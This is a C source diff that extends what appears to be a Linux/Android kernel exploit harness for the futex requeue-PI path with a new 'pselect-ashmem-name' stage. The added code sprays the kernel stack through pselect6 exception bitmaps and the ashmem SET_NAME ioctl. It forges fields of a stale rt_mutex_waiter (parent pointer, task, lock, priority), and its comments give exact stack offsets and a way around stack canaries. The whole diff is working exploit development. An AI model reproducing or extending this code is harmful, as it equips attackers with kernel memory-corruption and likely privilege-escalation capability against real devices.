@@ -99,6 +99,12 @@
 #ifndef SYS_sched_getaffinity
 #define SYS_sched_getaffinity 123
 #endif
+#ifndef SYS_pselect6
+#define SYS_pselect6 335
+#endif
+#ifndef SYS_ioctl
+#define SYS_ioctl 54
+#endif
 
 #ifndef FUTEX_LOCK_PI
 #define FUTEX_LOCK_PI 6
@@ -166,6 +172,10 @@
 #define SLOTSEARCH_PAGES 16
 #define SLOTSEARCH_PAGE_SIZE 4096
 #define CYCLE_FUTEX_REGION_LEN 4096
+#define ASHMEM_NAME_LEN 256
+#define ASHMEM_SET_NAME_CMD 0x41007701U
+#define PSELECT_ASHMEM_NFDS 320
+#define PSELECT_ASHMEM_INVALID_FD (PSELECT_ASHMEM_NFDS - 1)
 
 static uint32_t futex1;
 static uint32_t futex2;
@@ -231,6 +241,16 @@ static long io_submit_reqprio;
 static long io_submit_fd = -1;
 static int io_submit_word0_set;
 static int io_submit_word1_set;
+static uint64_t ashmem_tree_parent;
+static uint64_t ashmem_task;
+static uint64_t ashmem_lock;
+static long ashmem_prio = 130;
+static int ashmem_tree_parent_set;
+static int ashmem_task_set;
+static int ashmem_lock_set;
+static int waiter_ashmem_fd = -1;
+static uint32_t waiter_pselect_ex[PSELECT_ASHMEM_NFDS / 32];
+static uint8_t waiter_ashmem_name[ASHMEM_NAME_LEN];
 static int waiter_adjust_pi_after_post_return;
 static long waiter_adjust_pi_repeats = 1;
 static int adjust_pi_start_isolated_hold;
@@ -255,6 +275,10 @@ static long waiter_pipe_prime_read_ret;
 static int waiter_pipe_prime_read_errno;
 static long waiter_pipe_prime_write_ret;
 static int waiter_pipe_prime_write_errno;
+static long waiter_pselect_prime_ret;
+static int waiter_pselect_prime_errno;
+static long waiter_pselect_final_ret;
+static int waiter_pselect_final_errno;
 
 static int waiter_churn_fds[512];
 static size_t waiter_churn_fd_count;
@@ -2643,6 +2667,7 @@ static int waiter_post_return_mode_valid(void)
            waiter_post_return_mode_is("sigsuspend-block") ||
            waiter_post_return_mode_is("io-submit-usercopy") ||
            waiter_post_return_mode_is("pipe-read-io-submit") ||
+           waiter_post_return_mode_is("pselect-ashmem-name") ||
            waiter_post_return_mode_is("process-vm-readv") ||
            waiter_post_return_mode_is("process-vm-writev") ||
            waiter_post_return_mode_is("sched-affinity") ||
@@ -3608,6 +3633,177 @@ fail:
     __atomic_store_n(&waiter_active_hold_started, 1, __ATOMIC_RELEASE);
 }
 
+static int u64_contains_zero_byte(uint64_t value)
+{
+    for (unsigned int shift = 0; shift < 64; shift += 8) {
+        if (((value >> shift) & 0xffU) == 0) {
+            return 1;
+        }
+    }
+    return 0;
+}
+
+static int waiter_pselect_ashmem_prepare(void)
+{
+    uint64_t head_words[5] = {
+        ashmem_tree_parent,
+        0,
+        0,
+        0,
+        UINT64_C(1) << 63,
+    };
+    uint64_t name_words[4] = {
+        ashmem_task,
+        ashmem_lock,
+        ashmem_task,
+        ashmem_lock,
+    };
+
+    if (!waiter_post_return_mode_is("pselect-ashmem-name")) {
+        return 0;
+    }
+    if (!ashmem_tree_parent_set || !ashmem_task_set || !ashmem_lock_set ||
+        ashmem_tree_parent == 0 || ashmem_task == 0 || ashmem_lock == 0 ||
+        ashmem_prio <= 0 || ashmem_prio > UINT8_MAX) {
+        errno = EINVAL;
+        return -1;
+    }
+    /* ASHMEM_SET_NAME is a string copy; its first 32 bytes cannot contain NUL. */
+    if (u64_contains_zero_byte(ashmem_task) ||
+        u64_contains_zero_byte(ashmem_lock)) {
+        errno = EINVAL;
+        return -1;
+    }
+
+    memset(waiter_pselect_ex, 0, sizeof(waiter_pselect_ex));
+    memcpy(waiter_pselect_ex, head_words, sizeof(head_words));
+    memset(waiter_ashmem_name, 0, sizeof(waiter_ashmem_name));
+    memcpy(waiter_ashmem_name, name_words, sizeof(name_words));
+    waiter_ashmem_name[sizeof(name_words)] = (uint8_t)ashmem_prio;
+    waiter_ashmem_name[sizeof(name_words) + 1] = '\0';
+
+    waiter_ashmem_fd = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
+    if (waiter_ashmem_fd < 0) {
+        return -1;
+    }
+
+    /*
+     * compat_core_sys_select() caps n to files->max_fds.  Grow the table to
+     * cover all 320 bits, then leave fd 319 closed so pselect returns EBADF
+     * after copying the complete 40-byte exception bitmap to its stack.
+     */
+    if (dup2(waiter_ashmem_fd, PSELECT_ASHMEM_INVALID_FD) !=
+        PSELECT_ASHMEM_INVALID_FD) {
+        return -1;
+    }
+    if (close(PSELECT_ASHMEM_INVALID_FD) != 0) {
+        return -1;
+    }
+
+    printf("[W] pselect-ashmem prepared fd=%d tree_parent=0x%016llx task=0x%016llx lock=0x%016llx prio=%ld expected_waiter=stack+0x3c40 pselect_ex=waiter+0x00 ashmem_name=waiter+0x20\n",
+           waiter_ashmem_fd,
+           (unsigned long long)ashmem_tree_parent,
+           (unsigned long long)ashmem_task,
+           (unsigned long long)ashmem_lock,
+           ashmem_prio);
+    fflush(stdout);
+    return 0;
+}
+
+static int waiter_post_return_pselect_ashmem_name_probe(void)
+{
+    long select_ret;
+    int select_err;
+    long ioctl_ret;
+    int ioctl_err;
+    long final_select_ret = -1;
+    int final_select_err = 0;
+
+    /*
+     * Xpad3S compat geometry, relative to the syscall-entry stack baseline:
+     *
+     *   stale rt_mutex_waiter       B - 0x200
+     *   pselect exception bitmap    B - 0x200 (40 bytes)
+     *   ASHMEM_SET_NAME local_name  B - 0x1e0 (waiter + 0x20)
+     *
+     * pselect installs a safe leaf shape for tree_entry and leaves fd 319
+     * selected but closed, so it returns immediately with EBADF.  The very
+     * next syscall fills pi_right/pi_left/task/lock/prio.  Do not insert any
+     * syscall between these two calls.
+     */
+    errno = 0;
+    select_ret = syscall(SYS_pselect6,
+                         PSELECT_ASHMEM_NFDS,
+                         0L,
+                         0L,
+                         waiter_pselect_ex,
+                         0L,
+                         0L);
+    select_err = errno;
+    if (!(select_ret < 0 && select_err == EBADF)) {
+        __atomic_store_n(&waiter_pselect_prime_ret, select_ret,
+                         __ATOMIC_RELEASE);
+        __atomic_store_n(&waiter_pselect_prime_errno,
+                         select_ret < 0 ? select_err : 0,
+                         __ATOMIC_RELEASE);
+        errno = select_ret < 0 ? select_err : EIO;
+        return -1;
+    }
+
+    errno = 0;
+    ioctl_ret = syscall(SYS_ioctl, waiter_ashmem_fd,
+                        ASHMEM_SET_NAME_CMD, waiter_ashmem_name);
+    ioctl_err = errno;
+
+    /*
+     * ASHMEM_SET_NAME supplies task/lock/prio in the tail of the stale
+     * waiter, but an ioctl caller frame leaves its stack canary in
+     * tree_entry.rb_left.  Repeat pselect as the final W-side syscall so its
+     * 40-byte exception bitmap repairs tree_entry after the ioctl has
+     * returned.  The repeated task/lock pair in waiter_ashmem_name leaves the
+     * live fields at +0x30/+0x38, outside this final bitmap.
+     */
+    if (ioctl_ret == 0) {
+        errno = 0;
+        final_select_ret = syscall(SYS_pselect6,
+                                   PSELECT_ASHMEM_NFDS,
+                                   0L,
+                                   0L,
+                                   waiter_pselect_ex,
+                                   0L,
+                                   0L);
+        final_select_err = errno;
+    }
+
+    __atomic_store_n(&waiter_pselect_prime_ret, select_ret,
+                     __ATOMIC_RELEASE);
+    __atomic_store_n(&waiter_pselect_prime_errno, select_err,
+                     __ATOMIC_RELEASE);
+    __atomic_store_n(&waiter_pselect_final_ret, final_select_ret,
+                     __ATOMIC_RELEASE);
+    __atomic_store_n(&waiter_pselect_final_errno,
+                     final_select_ret < 0 ? final_select_err : 0,
+                     __ATOMIC_RELEASE);
+    __atomic_store_n(&waiter_post_return_last_ret, ioctl_ret,
+                     __ATOMIC_RELEASE);
+    __atomic_store_n(&waiter_post_return_last_errno,
+                     ioctl_ret < 0 ? ioctl_err : 0,
+                     __ATOMIC_RELEASE);
+    __atomic_store_n(&waiter_post_return_last_duration_us, -1,
+                     __ATOMIC_RELEASE);
+
+    asm volatile("" : : "r"(waiter_pselect_ex),
+                 "r"(waiter_ashmem_name), "r"(ioctl_ret) : "memory");
+
+    if (ioctl_ret == 0 && final_select_ret < 0 &&
+        final_select_err == EBADF) {
+        return 0;
+    }
+    errno = ioctl_ret < 0 ? ioctl_err
+                          : (final_select_ret < 0 ? final_select_err : EIO);
+    return -1;
+}
+
 struct pipe_prime_waker_args {
     int fd;
     int read_armed;
@@ -4184,6 +4380,10 @@ static int run_waiter_post_return_probe_once(void)
         return waiter_post_return_pipe_read_io_submit_probe();
     }
 
+    if (waiter_post_return_mode_is("pselect-ashmem-name")) {
+        return waiter_post_return_pselect_ashmem_name_probe();
+    }
+
     if (waiter_post_return_mode_is("process-vm-readv")) {
         return waiter_post_return_process_vm_probe(0);
     }
@@ -4531,7 +4731,8 @@ static int wait_post_return_probe_if_needed(void)
            __atomic_load_n(&waiter_post_return_probe_done, __ATOMIC_ACQUIRE),
            __atomic_load_n(&waiter_post_return_probe_failures, __ATOMIC_ACQUIRE));
     if (waiter_post_return_mode_is("io-submit-usercopy") ||
-        waiter_post_return_mode_is("pipe-read-io-submit")) {
+        waiter_post_return_mode_is("pipe-read-io-submit") ||
+        waiter_post_return_mode_is("pselect-ashmem-name")) {
         printf("[stage] %s ret=%ld errno=%d duration_us=%ld\n",
                waiter_post_return_mode,
                __atomic_load_n(&waiter_post_return_last_ret, __ATOMIC_ACQUIRE),
@@ -4543,6 +4744,18 @@ static int wait_post_return_probe_if_needed(void)
                    __atomic_load_n(&waiter_pipe_prime_read_errno, __ATOMIC_ACQUIRE),
                    __atomic_load_n(&waiter_pipe_prime_write_ret, __ATOMIC_ACQUIRE),
                    __atomic_load_n(&waiter_pipe_prime_write_errno, __ATOMIC_ACQUIRE));
+        }
+        if (waiter_post_return_mode_is("pselect-ashmem-name")) {
+            printf("[stage] pselect-prime ret=%ld errno=%d final_ret=%ld final_errno=%d expected_errno=%d\n",
+                   __atomic_load_n(&waiter_pselect_prime_ret,
+                                   __ATOMIC_ACQUIRE),
+                   __atomic_load_n(&waiter_pselect_prime_errno,
+                                   __ATOMIC_ACQUIRE),
+                   __atomic_load_n(&waiter_pselect_final_ret,
+                                   __ATOMIC_ACQUIRE),
+                   __atomic_load_n(&waiter_pselect_final_errno,
+                                   __ATOMIC_ACQUIRE),
+                   EBADF);
         }
     }
     fflush(stdout);
@@ -4672,6 +4885,14 @@ static void *waiter_thread(void *unused)
         return NULL;
     }
     add_ms_to_timespec(&timeout, waiter_timeout_ms);
+
+    if (waiter_pselect_ashmem_prepare() != 0) {
+        int prepare_errno = errno;
+        printf("[W] pselect-ashmem prepare failed errno=%d (%s)\n",
+               prepare_errno, strerror(prepare_errno));
+        fflush(stdout);
+        return NULL;
+    }
 
     __atomic_store_n(&waiter_waiting, 1, __ATOMIC_RELEASE);
     printf("[W] entering FUTEX_WAIT_REQUEUE_PI(futex1 -> futex2)\n");
@@ -5285,7 +5506,7 @@ static void usage(const char *argv0)
             "usage:\n"
             "  %s --stage-edeadlk-idle --i-understand-this-may-panic "
             "[--waiter-timeout-ms=N] [--idle-ms=N] "
-            "[--waiter-post-return=normal|quietspin|write|yield|gettid|clock|nanosleep|futexwake|readlink|readv-small|readv-large|readv-block-small|readv-block-large|preadv-socket|pwritev2-socket|epoll-block|sendmsg-block|sendmmsg-block|sendmmsg-name-block|sigsuspend-block|io-submit-usercopy|pipe-read-io-submit|process-vm-readv|process-vm-writev|sched-affinity|sched-affinity-loop|seccomperrno|seccomplog|seccompallowmark] "
+            "[--waiter-post-return=normal|quietspin|write|yield|gettid|clock|nanosleep|futexwake|readlink|readv-small|readv-large|readv-block-small|readv-block-large|preadv-socket|pwritev2-socket|epoll-block|sendmsg-block|sendmmsg-block|sendmmsg-name-block|sigsuspend-block|io-submit-usercopy|pipe-read-io-submit|pselect-ashmem-name|process-vm-readv|process-vm-writev|sched-affinity|sched-affinity-loop|seccomperrno|seccomplog|seccompallowmark] "
             "[--waiter-isolated-hold=busy|getpidloop|getuidloop|iosubmitloop|iosubmitcowloop|usleep|futexwaittag|seccompgetppid|seccompgetppidlog|seccompgetppidallowmark] "
             "[--waiter-adjust-pi-after-post-return] [--adjust-pi-start-isolated-hold] "
             "[--map-fixed-fake-lock] [--reuse-fixed-fake-lock-vma] "
@@ -5299,6 +5520,8 @@ static void usage(const char *argv0)
             "[--io-submit-word0=U64] [--io-submit-word1=U64] "
             "[--io-submit-task=U64] [--io-submit-lock=U64] "
             "[--io-submit-opcode=N] [--io-submit-reqprio=N] [--io-submit-fd=N] "
+            "[--ashmem-tree-parent=U64] [--ashmem-task=U64] "
+            "[--ashmem-lock=U64] [--ashmem-prio=N] "
             "[--churn-iterations=N] [--churn-keep-fds=N] "
             "[--process-vm-mb=N] "
             "[--churn-progress=each|final|none] "
@@ -5306,7 +5529,7 @@ static void usage(const char *argv0)
             "[--watchdog-sec=N]\n"
             "  %s --stage-waiter-exit-chainwalk --i-understand-this-may-panic "
             "[--waiter-timeout-ms=N] [--post-exit-delay-ms=N] "
-            "[--waiter-post-return=normal|quietspin|write|yield|gettid|clock|nanosleep|futexwake|readlink|readv-small|readv-large|readv-block-small|readv-block-large|preadv-socket|pwritev2-socket|epoll-block|sendmsg-block|sendmmsg-block|sendmmsg-name-block|sigsuspend-block|io-submit-usercopy|pipe-read-io-submit|process-vm-readv|process-vm-writev|sched-affinity|sched-affinity-loop|seccomperrno|seccomplog|seccompallowmark] "
+            "[--waiter-post-return=normal|quietspin|write|yield|gettid|clock|nanosleep|futexwake|readlink|readv-small|readv-large|readv-block-small|readv-block-large|preadv-socket|pwritev2-socket|epoll-block|sendmsg-block|sendmmsg-block|sendmmsg-name-block|sigsuspend-block|io-submit-usercopy|pipe-read-io-submit|pselect-ashmem-name|process-vm-readv|process-vm-writev|sched-affinity|sched-affinity-loop|seccomperrno|seccomplog|seccompallowmark] "
             "[--waiter-isolated-hold=busy|getpidloop|getuidloop|iosubmitloop|iosubmitcowloop|usleep|futexwaittag|seccompgetppid|seccompgetppidlog|seccompgetppidallowmark] "
             "[--waiter-adjust-pi-after-post-return] "
             "[--map-fixed-fake-lock] [--reuse-fixed-fake-lock-vma] "
@@ -5316,12 +5539,14 @@ static void usage(const char *argv0)
             "[--io-submit-word0=U64] [--io-submit-word1=U64] "
             "[--io-submit-task=U64] [--io-submit-lock=U64] "
             "[--io-submit-opcode=N] [--io-submit-reqprio=N] [--io-submit-fd=N] "
+            "[--ashmem-tree-parent=U64] [--ashmem-task=U64] "
+            "[--ashmem-lock=U64] [--ashmem-prio=N] "
             "[--main-final-shape=none|raw-getpid|raw-futexwake|raw-futexwait-eagain] [--quiet-final] "
             "[--watchdog-sec=N]\n"
             "  %s --stage-chainwalk --i-understand-this-may-panic "
             "[--waiter-timeout-ms=N] [--hold-ms=N] "
             "[--pre-chainwalk-delay-ms=N] [--pre-chainwalk-delay-us=N] "
-            "[--waiter-post-return=normal|quietspin|write|yield|gettid|clock|nanosleep|futexwake|readlink|readv-small|readv-large|readv-block-small|readv-block-large|preadv-socket|pwritev2-socket|epoll-block|sendmsg-block|sendmmsg-block|sendmmsg-name-block|sigsuspend-block|io-submit-usercopy|pipe-read-io-submit|process-vm-readv|process-vm-writev|sched-affinity|sched-affinity-loop|seccomperrno|seccomplog|seccompallowmark] "
+            "[--waiter-post-return=normal|quietspin|write|yield|gettid|clock|nanosleep|futexwake|readlink|readv-small|readv-large|readv-block-small|readv-block-large|preadv-socket|pwritev2-socket|epoll-block|sendmsg-block|sendmmsg-block|sendmmsg-name-block|sigsuspend-block|io-submit-usercopy|pipe-read-io-submit|pselect-ashmem-name|process-vm-readv|process-vm-writev|sched-affinity|sched-affinity-loop|seccomperrno|seccomplog|seccompallowmark] "
             "[--waiter-isolated-hold=busy|getpidloop|getuidloop|iosubmitloop|iosubmitcowloop|usleep|futexwaittag|seccompgetppid|seccompgetppidlog|seccompgetppidallowmark] "
             "[--waiter-adjust-pi-after-post-return] "
             "[--map-fixed-fake-lock] [--reuse-fixed-fake-lock-vma] "
@@ -5331,6 +5556,8 @@ static void usage(const char *argv0)
             "[--io-submit-word0=U64] [--io-submit-word1=U64] "
             "[--io-submit-task=U64] [--io-submit-lock=U64] "
             "[--io-submit-opcode=N] [--io-submit-reqprio=N] [--io-submit-fd=N] "
+            "[--ashmem-tree-parent=U64] [--ashmem-task=U64] "
+            "[--ashmem-lock=U64] [--ashmem-prio=N] "
             "[--main-final-shape=none|raw-getpid|raw-futexwake|raw-futexwait-eagain] [--quiet-final] "
             "[--waiter-churn=none|syscall|stack|stackshape|regspray|regsprayclean|fd|mix|memfd|pipe|epoll|unix|slotsearch|slotsearchlast|slotreadlinklast|slotfutexwaithold|slotsendmsghold|frameprobe|pressure] "
             "[--quiet-waiter-churn] "
@@ -5464,6 +5691,26 @@ int main(int argc, char **argv)
                     return 2;
                 }
                 io_submit_fd = value;
+                continue;
+            }
+            if (parse_u64_arg(argv[i], "--ashmem-tree-parent=", &ashmem_tree_parent)) {
+                ashmem_tree_parent_set = 1;
+                continue;
+            }
+            if (parse_u64_arg(argv[i], "--ashmem-task=", &ashmem_task)) {
+                ashmem_task_set = 1;
+                continue;
+            }
+            if (parse_u64_arg(argv[i], "--ashmem-lock=", &ashmem_lock)) {
+                ashmem_lock_set = 1;
+                continue;
+            }
+            if (parse_long_arg(argv[i], "--ashmem-prio=", &value)) {
+                if (value <= 0 || value > UINT8_MAX) {
+                    fprintf(stderr, "ashmem prio out of byte range: %s\n", argv[i]);
+                    return 2;
+                }
+                ashmem_prio = value;
                 continue;
             }
             if (parse_u64_arg(argv[i], "--fixed-fake-lock-addr=", &value_u64)) {
@@ -5614,6 +5861,14 @@ int main(int argc, char **argv)
         if (!waiter_post_return_mode_valid()) {
             fprintf(stderr, "invalid waiter post-return mode: %s\n",
                     waiter_post_return_mode);
+            return 2;
+        }
+        if (waiter_post_return_mode_is("pselect-ashmem-name") &&
+            (!ashmem_tree_parent_set || !ashmem_task_set ||
+             !ashmem_lock_set || ashmem_tree_parent == 0 ||
+             ashmem_task == 0 || ashmem_lock == 0)) {
+            fprintf(stderr,
+                    "pselect-ashmem-name requires nonzero --ashmem-tree-parent, --ashmem-task and --ashmem-lock\n");
             return 2;
         }
         if (!waiter_isolated_hold_mode_valid()) {
